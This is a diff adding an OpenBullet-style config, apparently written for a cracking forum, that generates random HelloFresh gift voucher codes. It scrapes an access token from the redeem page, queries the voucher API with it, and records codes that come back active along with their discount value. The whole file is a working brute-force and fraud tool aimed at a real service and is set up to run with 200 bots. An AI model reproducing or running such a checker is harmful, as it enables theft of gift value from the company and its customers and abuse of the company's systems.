@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "HelloFresh.com Generator and Checker",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-01-29T01:51:55.5487255+01:00",
+  "AdditionalInfo": "-- MADE FOR C.TO -- ",
+  "Author": "JustADude#7835",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?d?u?d?d?d?u?d?d?d" -> VAR "code" 
+
+REQUEST GET "https://www.hellofresh.com/gift/redeem" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+
+PARSE "<SOURCE>" LR "accessToken\":\"" "\",\"" -> VAR "tok" 
+
+REQUEST GET "https://www.hellofresh.com/gw/vouchers/<code>?country=US&locale=en-US" 
+  
+  HEADER "Authorization: Bearer <tok>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.hellofresh.com/gift/redeem" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "is_active\":true" 
+  KEYCHAIN Failure OR 
+    KEY "RESOURCE_NOT_FOUND" 
+
+FUNCTION Constant "<code>" -> CAP "Code:" 
+
+#Value PARSE "<SOURCE>" JSON "discount_value" CreateEmpty=FALSE -> CAP "" "$" "" 
+
